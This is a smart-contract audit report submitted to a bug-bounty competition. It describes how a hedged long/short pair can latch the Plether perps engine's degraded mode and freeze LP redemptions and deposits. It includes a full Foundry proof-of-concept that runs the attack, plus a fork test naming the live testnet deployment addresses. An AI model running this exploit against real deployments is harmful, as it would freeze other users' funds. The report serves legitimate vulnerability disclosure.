# \#99324 [SC-High] A net-zero hedged pair latches degraded mode and holds every LP exit frozen until the owner recapitalizes the pool

**Submitted on Nov 13th 2026 at 06:46:41 UTC by @krlz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99324
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

A trader with no net exposure can switch on the engine's degraded mode on a pool that is never short of cash and hold it there, freezing every LP exit. It opens a LONG and a SHORT leg to the admission limit, and after an ordinary basket move closes the winning leg, which pushes the pool's net assets below its maximum liability and sets `degradedMode`. By keeping the losing leg open it holds the pool in that state, so the owner cannot clear the flag without injecting fresh USDG, and every redemption, deposit and new order stays blocked.

## Vulnerability Details

After every close, `_applyClose` calls `_enterDegradedModeIfInsolvent` (`CfdEngine.sol#L1320`). It compares the pool's assets net of trader claims, `E`, with the larger directional liability, `L`, and latches as soon as `E < L` (`CfdEngine.sol#L1365-L1368`):

```solidity
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
}
```

The attacker reaches this state without directional risk. From two accounts it opens a LONG and a SHORT of equal size until `E` sits just above `L + B`, the limit for new positions (where `B` is 25 bps of `L`). After a basket move of about 1.25% it closes the winning leg. The profit is paid out of the pool while the matching loss is still unrealized on the other leg, so `E` drops below `L` and the engine latches.

No cash shortfall backs this latch. `L` is the open side's maximum-profit envelope, not a realized liability, and the losing leg's margin covers the profit the winning close paid out, so the pool still meets every real obligation. The project's containment is written for the opposite case. The terminal-deficit runbook "concerns actual negative terminal LP equity or trader payout claims that physical cash cannot currently service" (`SECURITY.md#L1501`), which this pair never creates. The attack drives that containment with no deficit behind it.

The attacker then keeps the losing leg open, and `E < L` persists for as long as it maintains the margin. Every way out of that state is closed. `clearDegradedMode()` is `onlyOwner` and reverts `CfdEngine__StillInsolvent` while `E < L` (`CfdEngine.sol#L658-L667`), so the owner cannot simply reset the flag. A keeper cannot take the leg either: it stays above maintenance, and `addMargin` has no degraded-mode gate (`CfdEngine.sol#L501-L527`), so the attacker tops it up at will. The only action that restores `E ≥ L` is `recapitalizePool`, which is `onlyOwner` and moves fresh owner USDG into the pool (`CfdEngine.sol#L632-L634`).

While the flag is set, every LP epoch settlement reverts on it alone (`HousePool.sol#L1867-L1869`), so no redemption is funded. Deposit activation is gated by the same flag (`HousePool.sol#L1143`), and a Junior deposit can no longer be cancelled once its hourly epoch has started (`TrancheVault.sol#L851-L859`), so a queued deposit is stuck in escrow without entering the pool. New opens are refused at commit for every trader (`OrderRouter__DegradedMode`, `OrderLiquidationBatchLogic.sol#L329`), so trading halts as well.

Even the cheaper variant griefs: if the attacker instead closes the losing leg and leaves, `E ≥ L` and the pool is solvent again, yet the flag stays set and the same settlement keeps reverting until the owner clears it by hand.

## Impact Details

Every LP exit of the pool is frozen while the attacker holds the leg, and no permissionless action ends it. Redemptions are not funded and escrowed deposits can neither activate nor be withdrawn. Ending the freeze is not free for the owner either. While `E < L` the flag cannot be cleared, so the owner has to inject fresh USDG to refill a gap the attacker manufactured on a pool that was never short of cash.

In the PoC the attacker holds the pool below its envelope for three days and the latch persists. It commits 400,000 USDG of margin, about a third of the frozen amount, and spends 7,456.77 USDG in fees and carry, while 1,061,183.27 USDG of LP capital stays frozen, including a 50,000 USDG deposit that never enters the pool. The owner clears the flag only by injecting 3,768.17 USDG. The same proportions hold at the live pool's 102.1M USDG: a margin commitment near a third of the pool and a spend near 0.57% of it freeze the pool's LP redemptions, and the owner's clear costs fresh USDG. The attack is repeatable.

## Link to Proof of Concept

https://gist.github.com/KirillZiborov/d420e35cb71ec1fd2d88ad57542be83e

## Proof of Concept

## Proof of Concept

The test runs in the repository's perps test suite (`BasePerpTest`) at the release risk parameters and drives the attack only through the public Router, with mock Pyth prices.

1. A Junior LP holds 200,000 USDG of shares. The attacker opens a hedged LONG/SHORT pair from two accounts up to the admission limit (`E` 1,202,000.26, `L` 1,197,400.00 USDG).
2. The LP requests a full redemption, and another LP requests a 50,000 USDG deposit.
3. The price moves 1.25%. The attacker closes the winning leg: `E` 1,193,631.83 falls below `L`, and degraded mode latches.
4. The attacker keeps the losing leg open. A third trader's open is refused at commit with `OrderRouter__DegradedMode`, and the held leg is not liquidatable.
5. 25 hours after the deposit epoch matures, `settleLpEpoch` reverts `HousePool__DegradedMode`, the redemption is unfunded, the deposit cannot be cancelled, and `clearDegradedMode` reverts `CfdEngine__StillInsolvent`.
6. Three days later the leg is still held and still solvent to a keeper, and the latch persists.
7. The owner injects 3,768.17 USDG with `recapitalizePool` and clears the flag. Settlement still reverts `HousePool__NoLpEpochProgress`, as the pool reserves against the open leg, and the redemption stays unfunded.
8. The attacker releases the leg and withdraws, recovering its margin. Only now does settlement fund the redemption. Its irrecoverable cost over the episode is 7,456.77 USDG against 1,061,183.27 USDG of LP capital frozen.

`testFork` runs against the live v2.0.0 deployment on Arbitrum Sepolia at block 325381938 and checks the starting conditions: 102.1M USDG of LP capital with zero pending escrow in both vaults, open interest on both sides, the release parameters, a healthy engine, and a single externally-owned clear authority.

Save the code as `packages/perps/test/perps/PoC.t.sol` and run `forge test --root packages/perps --match-path test/perps/PoC.t.sol -vv`. The fork test reads `ARBITRUM_SEPOLIA_RPC_URL`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

contract HedgedPairDegradedFreeze is BasePerpTest {
    address internal longAcct = address(0xA11CE);
    address internal shortAcct = address(0xB0B);
    address internal redeemer = address(0xE51);
    address internal depositor = address(0xDA7E);
    address internal thirdTrader = address(0x571C71);

    // Live v2.0.0 Arbitrum Sepolia addresses (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0).
    uint256 internal constant FORK_BLOCK = 325381938;
    address internal constant LIVE_ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant LIVE_SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant LIVE_JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant LIVE_OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        vm.label(longAcct, "attacker-long-leg-held");
        vm.label(shortAcct, "attacker-short-leg-closed");
        vm.label(redeemer, "incumbent-junior-lp");
        vm.label(depositor, "incoming-junior-lp");
        vm.label(thirdTrader, "third-trader");
    }

    function _routerTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint64 id = router.nextCommitId();
        vm.prank(account);
        router.commitOrder(side, size, margin, 0, isClose);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "router order executed");
    }

    function _maxLiab() internal view returns (uint256) {
        (uint256 longMaxProfit,,,) = engine.sides(0);
        (uint256 shortMaxProfit,,,) = engine.sides(1);
        return longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
    }

    function _effectiveAssets() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _fillHedgedPair() internal {
        uint256 chunk = 2500 * 1e20; // 250,000 USDG notional at price 1.00
        for (uint256 i; i < 8; ++i) {
            uint256 l = _maxLiab();
            uint256 e = pool.totalAssets();
            uint256 next = l + 250_000e6;
            if (e < next + (next * 30) / 10_000 + 2_000e6) {
                break;
            }
            _routerTrade(longAcct, CfdTypes.Side.LONG, chunk, 12_500e6, false, 1e8);
            _routerTrade(shortAcct, CfdTypes.Side.SHORT, chunk, 12_500e6, false, 1e8);
        }
        uint256 l2 = _maxLiab();
        uint256 room = (pool.totalAssets() * 10_000) / 10_030;
        if (room > l2 + 2_000e6) {
            uint256 extraLots = (room - l2 - 1_000e6) / 1e8;
            if (extraLots >= 10) {
                _routerTrade(longAcct, CfdTypes.Side.LONG, extraLots * 1e20, 5_000e6, false, 1e8);
                _routerTrade(shortAcct, CfdTypes.Side.SHORT, extraLots * 1e20, 5_000e6, false, 1e8);
            }
        }
    }

    function testLocal() public {
        assertEq(engine.executionFeeBps(), 4, "release execution fee");

        // An incumbent Junior LP holds 200,000 USDG of shares, past the deposit cooldown.
        _fundJunior(redeemer, 200_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        router.updateMarkPrice(_mockPythUpdateData(1e8));

        // The attacker builds a net-zero pair up to the admission buffer (400,000 USDG of settlement in total).
        _fundTrader(longAcct, 200_000e6);
        _fundTrader(shortAcct, 200_000e6);
        _fillHedgedPair();
        emit log_named_uint("E after the hedged fill (USDG)", _effectiveAssets());
        emit log_named_uint("L after the hedged fill (USDG)", _maxLiab());
        assertFalse(engine.degradedMode(), "healthy after the hedged fill");

        // The incumbent LP asks to redeem all of its shares; an incoming LP asks to deposit 50,000 USDG.
        uint256 redeemerShares = juniorVault.balanceOf(redeemer);
        vm.prank(redeemer);
        uint256 redeemId = juniorVault.requestRedeem(redeemerShares, redeemer, redeemer);
        uint256 depositAssets = 50_000e6;
        settlementToken.mint(depositor, depositAssets);
        vm.startPrank(depositor);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depositId = juniorVault.requestDeposit(depositAssets, depositor, depositor);
        vm.stopPrank();

        // A 1.25% basket move. The attacker closes the winning SHORT leg: E falls below L and degraded mode latches.
        uint256 movedPrice = 1.0125e8;
        router.updateMarkPrice(_mockPythUpdateData(movedPrice));
        (uint256 shortSize,,,,,,) = engine.positions(shortAcct);
        _routerTrade(shortAcct, CfdTypes.Side.SHORT, shortSize, 0, true, movedPrice);
        emit log_named_uint("E after the winning-leg close (USDG)", _effectiveAssets());
        emit log_named_uint("L after the winning-leg close (USDG)", _maxLiab());
        assertLt(_effectiveAssets(), _maxLiab(), "raw E < L after the winning-leg close");
        assertTrue(engine.degradedMode(), "degraded mode latched");

        // The attacker KEEPS the losing LONG leg open, so E < L persists for as long as it maintains the margin.
        (uint256 longSize,,,,,,) = engine.positions(longAcct);
        assertGt(longSize, 0, "the losing leg stays open");

        // Every new open is refused at commit while the engine is degraded: trading is halted, not just LP exits.
        _fundTrader(thirdTrader, 100_000e6);
        vm.startPrank(thirdTrader);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        router.commitOrder(CfdTypes.Side.SHORT, 1000 * 1e20, 5_000e6, 0, false);
        vm.stopPrank();

        // A keeper cannot take the held leg: at the current mark it is well above maintenance, so it is not liquidatable.
        assertFalse(publicLens.isLiquidatable(longAcct), "the held leg is solvent; no keeper can take it");

        // 25 hours after the deposit epoch matures, every LP exit is still frozen on the flag alone.
        vm.warp(juniorVault.depositEpochStart(depositId) + 1 + 25 hours);
        router.updateMarkPrice(_mockPythUpdateData(movedPrice));
        assertFalse(engine.isFadWindow(), "no FAD window");
        assertFalse(engine.isOracleFrozen(), "no frozen window");
        bytes[] memory settlePayload = _mockPythUpdateData(movedPrice);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch(settlePayload);
        assertEq(juniorVault.claimableRedeemRequest(redeemId, redeemer), 0, "the redemption is not funded");
        vm.prank(depositor);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(depositId);
        assertEq(juniorVault.pendingDepositRequest(depositId, depositor), depositAssets, "deposit escrow stuck");

        // The owner cannot end the state: E < L blocks clearDegradedMode.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Three days later the leg is still held: carry accrues but the posted margin keeps it solvent to a keeper.
        vm.warp(block.timestamp + 3 days);
        engine.checkpointCarryIndexes();
        assertFalse(publicLens.isLiquidatable(longAcct), "still solvent after three days of carry");
        assertTrue(engine.degradedMode(), "still latched and held three days later");

        // Only owner recapitalization with fresh USDG restores E >= L and lets the owner clear the flag.
        uint256 gap = _maxLiab() - _effectiveAssets();
        emit log_named_uint("owner must inject fresh USDG to clear (USDG)", gap);
        settlementToken.mint(address(this), gap);
        settlementToken.approve(address(engine), gap);
        engine.recapitalizePool(gap);
        assertGe(_effectiveAssets(), _maxLiab(), "recapitalized above the envelope");
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner clears only after paying");

        // Even after the owner clears, the pool reserves against the still-open leg, so no LP exit is funded yet.
        bytes[] memory postClearPayload = _mockPythUpdateData(movedPrice);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        router.settleLpEpoch(postClearPayload);
        assertEq(juniorVault.claimableRedeemRequest(redeemId, redeemer), 0, "redemption still unfunded while the leg is open");

        // The attacker releases the leg (its loss flows back) and withdraws; only now does settlement fund the LPs.
        (uint256 heldSize,,,,,,) = engine.positions(longAcct);
        _routerTrade(longAcct, CfdTypes.Side.LONG, heldSize, 0, true, movedPrice);
        vm.startPrank(longAcct);
        clearinghouse.withdrawMargin(clearinghouse.balanceAssets(longAcct));
        vm.stopPrank();
        router.updateMarkPrice(_mockPythUpdateData(movedPrice));
        router.settleLpEpoch(_mockPythUpdateData(movedPrice));
        assertGt(juniorVault.claimableRedeemRequest(redeemId, redeemer), 0, "redemption funded once the leg releases");

        uint256 attackerRecovered = clearinghouse.balanceAssets(longAcct) + clearinghouse.balanceAssets(shortAcct)
            + settlementToken.balanceOf(longAcct) + settlementToken.balanceOf(shortAcct);
        uint256 attackerCost = 400_000e6 - attackerRecovered;
        emit log_named_uint("attacker total cost of the episode (USDG)", attackerCost);
        uint256 frozenLpCapital = pool.totalAssets() + depositAssets;
        emit log_named_uint("LP capital that was frozen (USDG)", frozenLpCapital);
        emit log_named_uint("frozen LP capital per USDG spent (x)", frozenLpCapital / attackerCost);
        assertGe(frozenLpCapital / attackerCost, 100, "frozen LP capital at least 100x the attacker's irrecoverable spend");
    }

    function testFork() public {
        vm.createSelectFork(vm.envString("ARBITRUM_SEPOLIA_RPC_URL"), FORK_BLOCK);

        // Premise: LP capital is in the pool; once latched, none of it can exit until the owner clears.
        uint256 liveJunior = IVaultView(LIVE_JUNIOR_VAULT).totalAssets();
        uint256 liveSenior = IVaultView(LIVE_SENIOR_VAULT).totalAssets();
        emit log_named_uint("live Junior tranche assets (USDG)", liveJunior);
        emit log_named_uint("live Senior tranche assets (USDG)", liveSenior);
        assertGt(liveJunior + liveSenior, 1_000_000e6, "the live tranches hold LP capital");

        // Census: no pending escrow at the block, so the frozen amount in production is the LP capital unable to exit.
        assertEq(IVaultView(LIVE_JUNIOR_VAULT).pendingDepositEscrowAssets(), 0, "no Junior deposit escrow");
        assertEq(IVaultView(LIVE_JUNIOR_VAULT).pendingRedeemEscrowShares(), 0, "no Junior redeem escrow");
        assertEq(IVaultView(LIVE_SENIOR_VAULT).pendingDepositEscrowAssets(), 0, "no Senior deposit escrow");
        assertEq(IVaultView(LIVE_SENIOR_VAULT).pendingRedeemEscrowShares(), 0, "no Senior redeem escrow");

        // Premise: release parameters, healthy engine, normal pricing regime.
        assertEq(IEngineView(LIVE_ENGINE).executionFeeBps(), 4, "live execution fee is the release value");
        assertFalse(IEngineView(LIVE_ENGINE).degradedMode(), "live engine not degraded");
        assertFalse(IEngineView(LIVE_ENGINE).isOracleFrozen(), "no live frozen window");
        assertFalse(IEngineView(LIVE_ENGINE).isFadWindow(), "no live FAD window");

        // Premise: both sides carry open interest, so a hedged pair is ordinary market state.
        (uint256 longMaxProfit,,,) = IEngineView(LIVE_ENGINE).sides(0);
        (uint256 shortMaxProfit,,,) = IEngineView(LIVE_ENGINE).sides(1);
        assertGt(longMaxProfit, 0, "live LONG open interest");
        assertGt(shortMaxProfit, 0, "live SHORT open interest");

        // Premise: the only clear authority is one externally-owned account.
        assertEq(IEngineView(LIVE_ENGINE).owner(), LIVE_OWNER, "engine owner is the single clear authority");
        assertEq(LIVE_OWNER.code.length, 0, "the clear authority is an externally-owned account");
    }
}

interface IVaultView {
    function totalAssets() external view returns (uint256);
    function pendingDepositEscrowAssets() external view returns (uint256);
    function pendingRedeemEscrowShares() external view returns (uint256);
}

interface IEngineView {
    function degradedMode() external view returns (bool);
    function executionFeeBps() external view returns (uint256);
    function isOracleFrozen() external view returns (bool);
    function isFadWindow() external view returns (bool);
    function owner() external view returns (address);
    function sides(uint256) external view returns (uint256, uint256, uint256, uint256);
}
```
